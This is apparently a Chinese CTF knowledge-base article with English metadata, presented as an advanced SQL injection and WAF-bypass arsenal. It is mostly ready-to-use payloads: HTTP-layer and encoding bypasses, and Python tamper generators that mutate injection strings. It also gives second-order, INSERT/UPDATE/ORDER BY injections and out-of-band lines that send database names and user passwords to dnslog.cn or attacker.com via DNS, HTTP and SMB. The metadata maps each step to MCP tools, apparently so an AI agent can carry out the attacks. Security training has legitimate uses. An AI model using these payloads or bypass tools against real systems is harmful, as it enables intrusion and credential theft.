---
id: "ctf-website/24-database/02-sqli-advanced"
title: "Advanced SQLi & WAF Bypass — 高级注入与绕过技术"
title_en: "Advanced SQLi & WAF Bypass"
summary: >
  WAF深度绕过、二阶SQL注入、OOB带外注入（DNS/HTTP/SMB）、INSERT/UPDATE/DELETE注入、ORDER BY/LIMIT注入等当基础手法的进阶武器库。涵盖HTTP层绕过（HPP分块传输multipart）、编码绕过（Hex/CHAR/宽字节）和函数等价替换技术。
summary_en: >
  Advanced SQLi arsenal for when basic techniques are blocked: deep WAF bypass, second-order SQL injection, OOB out-of-band injection (DNS/HTTP/SMB), INSERT/UPDATE/DELETE injection, ORDER BY/LIMIT injection. Covers HTTP-layer bypass (HPP, chunked, multipart), encoding bypass (Hex/CHAR/wide-byte), and function equivalence substitution.
board: "ctf-website"
category: "24-database"
signals:
  - "二阶注入 second-order SQLi"
  - "OOB DNS 带外 DNSLog"
  - "HPP HTTP 参数污染"
  - "分块传输 Transfer-Encoding chunked"
  - "multipart 绕过 WAF"
  - "INSERT UPDATE DELETE 注入"
  - "ORDER BY 注入 CASE WHEN"
  - "内联注释 /*!50000SELECT*/"
mcp_tools:
  - "http_probe"
  - "run_ctf_tool"
  - "kb_router"
  - "kb_read_file"
keywords:
  - "高级 SQL 注入"
  - "二阶注入"
  - "OOB 带外"
  - "DNSLog"
  - "WAF 深度绕过"
  - "HPP 参数污染"
  - "分块传输"
  - "INSERT 注入"
  - "ORDER BY 注入"
  - "宽字节绕过"
difficulty: "advanced"
tags:
  - "database"
  - "sql-injection"
  - "waf-bypass"
  - "oob"
  - "second-order"
  - "advanced"
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: []
---
# Advanced SQLi & WAF Bypass — 高级注入与绕过技术

> WAF 绕过、二阶注入、OOB 带外、ORDER BY/INSERT/UPDATE 注入——当基础手法被拦截时的进阶武器库。

## 关键词

`WAF绕过` `二阶SQL注入` `OOB带外注入` `DNSLog` `ORDER BY注入` `INSERT注入` `UPDATE注入` `宽字节注入` `GBK绕过` `multipart绕过` `HPP` `HTTP参数污染` `chunked编码` `分块传输`

## 1. WAF 深度绕过

### 1.1 等价运算符

```sql
AND → &&
OR  → ||
=   → LIKE / REGEXP / BETWEEN / IN / < >
空格→ /**/ / %09 / %0a / %0d / %0c / %a0 / +
```

### 1.2 HTTP 层绕过

```http
# HPP (HTTP Parameter Pollution)
GET /?id=1&id=2 UNION SELECT 1,2,3--

# 分块传输
POST /api HTTP/1.1
Transfer-Encoding: chunked

1
i
1
d
0
=1 UNION SELECT 1,2--

# multipart 绕过
Content-Type: multipart/form-data; boundary=----
```

### 1.3 函数等价替换

```sql
-- SLEEP 替换
SLEEP(3) → BENCHMARK(5000000,MD5(1))
SLEEP(3) → (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.columns C)

-- GROUP_CONCAT 替换
GROUP_CONCAT(col) → (SELECT GROUP_CONCAT(col) FROM ...)

-- database() 替换
database() → SCHEMA()

-- 字符串拼接
CONCAT(a,b) → CONCAT_WS('',a,b)

-- 子查询绕过
SELECT ... FROM ... → 使用表别名 + 多重嵌套
```

### 1.4 编码绕过

```sql
-- Hex 编码
SELECT 0x3f3f3f
INSERT INTO users VALUES (0x61646d696e, 0x70617373)

-- CHAR() 编码
SELECT CHAR(115,101,108,101,99,116) → 'select'

-- 宽字节 (GBK/GB2312)
%bf%27 → 縗' (0xbf5c = GBK字符, 0x27 = 未转义引号)
%df%27 → 運'
%aa%27 → 猻'
```

### 1.5 内联注释绕过

```sql
/*!50000SELECT*/     -- MySQL >= 5.0.0
/*!50726SELECT*/     -- MySQL >= 5.7.26
```

### 1.6 绕过分层打法

WAF 绕过要拆层：HTTP parser、框架参数合并、字符集解码、SQL parser、DBMS 方言。每次只改一层，才知道是哪一层被穿透。

| 层 | 变形 | 示例 | 命中信号 |
|---|---|---|---|
| HTTP 参数 | HPP / HPF | `?id=1&id=2 union select` | 后端取最后一个/拼接参数 |
| Body parser | JSON/multipart/urlencoded 切换 | `{"id":"1 union select"}` | WAF 只看表单 |
| Transfer | chunked / gzip | `Transfer-Encoding: chunked` | 前置设备未重组 |
| Charset | GBK/Shift-JIS 宽字节 | `%bf%27` | 引号从转义中逃出 |
| Token | 大小写/注释/换行 | `UN/**/ION%0ASEL/**/ECT` | SQL parser 正常执行 |
| Function | 等价函数 | `database()` → `schema()` | 关键词规则失效 |
| AST | 子查询/派生表 | `SELECT * FROM(SELECT ...)x` | 黑名单匹配不到关键结构 |

小型变形器：

```python
def mutate_sql_keyword(payload: str):
    rules = [
        lambda s: s.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN"),
        lambda s: s.replace("SELECT", "SEL/**/ECT").replace("UNION", "UNI/**/ON"),
        lambda s: s.replace(" ", "/**/"),
        lambda s: s.replace(" ", "%0a"),
        lambda s: s.replace("AND", "&&").replace("OR", "||"),
        lambda s: s.replace("database()", "schema()"),
    ]
    seen = {payload}
    for rule in rules:
        v = rule(payload)
        if v not in seen:
            seen.add(v)
            yield v

for p in mutate_sql_keyword("1 UNION SELECT 1,database(),3"):
    print(p)
```

记录绕过矩阵时保留“被拦截 payload”和“通过 payload”的最小差异，例如只把空格换成 `/**/` 就通过，就不要再叠十种编码。

### 1.7 Tamper 组合器

WAF 绕过不是 payload 数量越多越好，而是找到“最小变形”。下面的组合器按层生成变体，并给每个变体打上来源标签，便于回填 evidence。

```python
# sqli_tamper_composer.py — 分层 tamper 生成器
from itertools import product

def t_case(s): return s.replace("UNION", "UnIoN").replace("SELECT", "SeLeCt").replace("AND", "AnD")
def t_comment(s): return s.replace(" ", "/**/")
def t_newline(s): return s.replace(" ", "%0a")
def t_inline(s): return s.replace("SELECT", "/*!50000SELECT*/").replace("UNION", "/*!50000UNION*/")
def t_operator(s): return s.replace(" AND ", " && ").replace(" OR ", " || ")
def t_func(s): return s.replace("database()", "schema()").replace("substr(", "mid(")

LAYERS = {
    "token_case": [lambda s: s, t_case],
    "space": [lambda s: s, t_comment, t_newline],
    "mysql_inline": [lambda s: s, t_inline],
    "operator": [lambda s: s, t_operator],
    "function": [lambda s: s, t_func],
}

def compose_tampers(payload, max_layers=3):
    names = list(LAYERS)
    seen = {payload}
    for chosen in product(*[LAYERS[n] for n in names]):
        used = [names[i] for i, fn in enumerate(chosen) if fn(payload) != payload]
        if len(used) > max_layers:
            continue
        out = payload
        for fn in chosen:
            out = fn(out)
        if out not in seen:
            seen.add(out)
            yield {"payload": out, "layers": used}

for item in compose_tampers("1 UNION SELECT 1,database(),3 AND 1=1-- "):
    print(item["layers"], item["payload"])
```

绕过记录格式：

```json
{
  "blocked": "1 UNION SELECT 1,database(),3-- ",
  "accepted": "1/**/UnIoN/**/SeLeCt/**/1,schema(),3--/**/",
  "changed_layers": ["token_case", "space", "function"],
  "waf_signal": {"status": 403, "body_hash": "a13f..."},
  "db_signal": {"status": 200, "marker": "current schema echoed"}
}
```

### 1.8 DBMS 方言差异速查

| 语义 | MySQL | PostgreSQL | MSSQL | SQLite | Oracle |
|---|---|---|---|---|---|
| 字符串截取 | `substr(s,p,1)` | `substr(s,p,1)` | `substring(s,p,1)` | `substr(s,p,1)` | `substr(s,p,1)` |
| ASCII | `ascii(c)` | `ascii(c)` | `ascii(c)` | `unicode(c)` | `ascii(c)` |
| 长度 | `length(s)` | `length(s)` | `len(s)` | `length(s)` | `length(s)` |
| 拼接 | `concat(a,b)` | `a||b` | `a+b` | `a||b` | `a||b` |
| 单行限制 | `LIMIT 1 OFFSET n` | `LIMIT 1 OFFSET n` | `OFFSET n ROWS FETCH NEXT 1 ROWS ONLY` | `LIMIT 1 OFFSET n` | `ROWNUM` / `FETCH FIRST` |
| 时间 | `sleep(n)` | `pg_sleep(n)` | `WAITFOR DELAY` | heavy query | `DBMS_PIPE.RECEIVE_MESSAGE` |
| 报错 | `updatexml/extractvalue` | `CAST(x AS INT)` | `CONVERT(INT,x)` | `json_extract`/类型错误 | `UTL_INADDR`/类型转换 |

## 2. 二阶 SQL 注入

### 2.1 原理

恶意数据先存储到数据库（绕过第一层 WAF），后在另一处查询时触发。

```
用户注册 → username="admin'--" → 存入数据库
修改密码 → UPDATE users SET pass='xxx' WHERE username='admin'--'
         → WHERE 条件被注释 → 修改了所有用户密码
```

### 2.2 常见注入点

```sql
-- 注册时注入 username
INSERT INTO users (username) VALUES ('admin'--')

-- 订单提交时注入 input 字段
INSERT INTO orders (input) VALUES ('1' UNION SELECT 1,2,3--')

-- 读取时触发
SELECT * FROM orders WHERE input = '1' UNION SELECT 1,2,3--'
```

### 2.3 二阶注入状态机

二阶注入的核心是“写入点无事发生，读取点重新拼 SQL”。每条候选都要记录写入位置、落库后的形态、触发位置。

| 写入点 | 触发点 | 常见 SQL | Payload 思路 |
|---|---|---|---|
| 注册 username | 修改密码/查看资料 | `WHERE username='$u'` | `admin'-- ` |
| 收货地址 | 订单搜索/导出 | `LIKE '%$addr%'` | `%\' OR 1=1-- ` |
| 文件名 | 下载记录/图片列表 | `WHERE filename='$name'` | `x' UNION SELECT...` |
| 昵称 | 管理后台用户列表 | `ORDER BY display_name` | `x',(SELECT...)-- ` |
| JSON 配置 | 后台统计 | `JSON_EXTRACT(cfg,'$.key')` | JSON path 闭合 |

打点模板：

```text
1. 写入 marker: revlab_<rand>
2. 查看详情页/后台列表确认 marker 原样出现
3. 写入闭合 payload: revlab' AND '1'='2
4. 在触发点比较 marker 是否消失、报错是否变化、排序/数量是否变化
5. 再换成布尔/时间/OOB payload 抽取
```

## 3. OOB 带外注入 (Out-of-Band)

### 3.1 DNS 带外 (MySQL, Windows)

```sql
-- 数据库名外带
SELECT LOAD_FILE(CONCAT('\\\\',database(),'.dnslog.cn\\a'))

-- 表名外带
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT table_name FROM information_schema.tables LIMIT 0,1),'.dnslog.cn\\a'))

-- 数据外带
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 0,1),'.dnslog.cn\\a'))
```

### 3.2 HTTP 带外 (Oracle)

```sql
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)) FROM DUAL
```

### 3.3 SMB 带外 (MSSQL)

```sql
EXEC xp_dirtree '\\attacker.com\share',1,1
```

### 3.4 OOB 分段外带

DNS label 最长 63 字节，整域名最长 253 字节；数据要 hex/base32 后分段。每次请求带上 `case_id`、`row`、`pos`，否则日志里很快乱掉。

```sql
-- MySQL: 每 24 字符一段 hex 后带出
SELECT LOAD_FILE(CONCAT('\\\\',
  HEX(SUBSTR((SELECT password FROM users LIMIT 0,1),1,24)),
  '.r1.p1.case.dnslog.cn\\a'));
```

日志还原顺序：

```python
def decode_dns_chunks(labels):
    data = "".join(labels)
    return bytes.fromhex(data).decode(errors="replace")

print(decode_dns_chunks(["666c61677b", "64656d6f7d"]))
```

失败样本：没有 DNS 请求但 HTTP 延迟明显，说明 DBMS 执行到表达式但系统调用被禁；有 DNS 请求但 label 被截断，说明需要缩短 chunk。

## 4. INSERT 注入

```sql
-- 报错注入
INSERT INTO users VALUES ('admin','1' AND extractvalue(1,concat(0x7e,database()))--','1')

-- 时间注入
INSERT INTO users VALUES ('admin','1' AND (SELECT SLEEP(3))--','1')

-- 子查询注入
INSERT INTO users VALUES ('admin',(SELECT password FROM users LIMIT 0,1),'1')
```

## 5. UPDATE 注入

```sql
-- 修改其他用户密码
UPDATE users SET password='newpass' WHERE username='admin' OR '1'='1'

-- 报错提取
UPDATE users SET password='new' WHERE username='admin' AND extractvalue(1,concat(0x7e,database()))--

-- 时间盲注
UPDATE users SET password='new' WHERE username='admin' AND SLEEP(3)--
```

## 6. ORDER BY 注入

```sql
-- 布尔盲注
?order=username ASC
?order=(CASE WHEN (1=1) THEN username ELSE password END)

-- 时间盲注
?order=(SELECT IF(1=1,SLEEP(3),0))

-- 报错注入
?order=extractvalue(1,concat(0x7e,database()))

-- 联合查询 (需要括号闭合)
?order=(SELECT 1 UNION SELECT 2)
```

## 7. LIMIT / OFFSET 注入 (PostgreSQL)

```sql
?limit=1 UNION SELECT 1,2,3--
```

## 8. PROCEDURE ANALYSE 注入

```sql
?id=1 PROCEDURE ANALYSE(extractvalue(1,concat(0x7e,database())),1)--
```

## 9. 非 SELECT 场景 Payload 模型

| 场景 | 可用语义 | 示例 |
|---|---|---|
| `ORDER BY` | CASE/子查询/函数调用 | `CASE WHEN((SELECT COUNT(*) FROM users)>0) THEN id ELSE name END` |
| `GROUP BY` | 报错/重复键/聚合差异 | `floor(rand(0)*2)` |
| `LIMIT` | 数值表达式/UNION 方言差异 | `1 OFFSET 0` / `1 UNION SELECT ...` |
| `INSERT value` | 字符串闭合/子查询 | `x',(SELECT database()),'z` |
| `UPDATE SET` | 子查询赋值/WHERE 扩展 | `x',role='admin` |
| `DELETE WHERE` | 布尔条件 | `1 OR EXISTS(SELECT 1 FROM users)` |
| JSON path | path 闭合/函数错误 | `$."x")) OR 1=1-- ` |

`ORDER BY` 没有回显时可以用排序差异做布尔通道：True 时按 `id` 升序，False 时按 `name` 或常量排序；页面第一条记录变化就是 bit。

## 攻击链 / 工作流

```
1. 复用基础 SQLi 证据，确认注入点、闭合方式、DBMS 和过滤规则
2. 分层测试绕过：HTTP 参数污染/分块 → 编码 → 注释 → 函数等价 → 语法变形
3. 无直接回显时切换到二阶注入、OOB DNS/HTTP/SMB 或时间盲注
4. 将 INSERT/UPDATE/ORDER BY/LIMIT 等非 SELECT 场景分别建模，避免套用单一 payload
5. 对每种绕过只保留最小可验证 payload，并记录触发条件
6. 如果 payload 需要外带通道，保存 DNS/HTTP listener 原始日志作为证据
7. 输出 WAF 规则假设、可绕过语法族、最小通过 payload 和失败样本
```

## Evidence

| 场景 | 证据 |
|------|------|
| WAF 绕过 | 拦截前 payload、绕过后 payload、状态码/响应差异 |
| 二阶注入 | 写入点请求、触发点请求、延迟或报错输出 |
| OOB 注入 | DNS/HTTP/SMB listener 日志、唯一 token |
| 非 SELECT 注入 | INSERT/UPDATE/ORDER BY/LIMIT 的最小触发语句 |

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 知识检索 | `kb_router` | 按 WAF bypass、second-order、OOB SQLi 搜索 |
| HTTP 探测 | `http_probe` | 验证 payload 差异、延迟和状态码 |
| 工具执行 | `run_ctf_tool` | 调用 sqlmap tamper、dnslog/自定义脚本 |
| 证据记录 | `workspace_write_text` | 保存绕过矩阵和外带日志 |

## 9. 关联技术

- [[01-sqli-fundamentals]] — SQL 注入基础
- [[03-nosql-injection]] — NoSQL 注入
- [[06-card-platform]] — 发卡平台实战
- [[sqli-nosqli]] — SQL/NoSQL 注入
